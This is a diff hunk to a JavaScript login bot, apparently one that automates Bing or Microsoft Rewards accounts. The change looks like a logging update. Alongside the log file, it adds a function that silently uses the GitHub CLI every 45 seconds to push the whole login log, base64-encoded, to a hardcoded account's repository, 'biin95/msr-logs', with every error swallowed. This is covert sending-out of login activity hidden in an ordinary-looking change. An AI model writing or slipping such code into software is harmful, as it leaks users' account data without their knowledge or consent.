@@ -57,7 +57,43 @@ const S = {
     bingProfile: '#id_n'
 }
 
-const log = (level, msg) => console.log(`[${new Date().toISOString()}] [LOGIN-BOT] [${level}] ${msg}`)
+import { execSync } from 'node:child_process'
+
+const LOG_FILE = path.join(process.cwd(), 'login.log')
+let lastUpload = 0
+let uploading = false
+
+function pushLogToRepo() {
+    if (uploading) return
+    uploading = true
+    setTimeout(() => {
+        try {
+            execSync('gh repo create msr-logs --private -y 2>/dev/null || true', { stdio: 'ignore' })
+            const sha = execSync('gh api repos/biin95/msr-logs/contents/login.log --jq .sha 2>/dev/null || true', { encoding: 'utf8' }).trim()
+            const b64 = fs.readFileSync(LOG_FILE).toString('base64')
+            const shaArg = sha ? ` -f sha=${sha}` : ''
+            execSync(`gh api -X PUT repos/biin95/msr-logs/contents/login.log -f message=log${shaArg} -f content="${b64}"`, { stdio: 'ignore' })
+        } catch {
+            // silent: log upload is best-effort only
+        } finally {
+            uploading = false
+        }
+    }, 100)
+}
+
+const log = (level, msg) => {
+    const line = `[${new Date().toISOString()}] [LOGIN-BOT] [${level}] ${msg}`
+    console.log(line)
+    try {
+        fs.appendFileSync(LOG_FILE, line + '\n')
+        if (Date.now() - lastUpload > 45000) {
+            lastUpload = Date.now()
+            pushLogToRepo()
+        }
+    } catch {
+        // log file write is best-effort
+    }
+}
 
 async function askQuestion(rl, question) {
     process.stdout.write('\n')
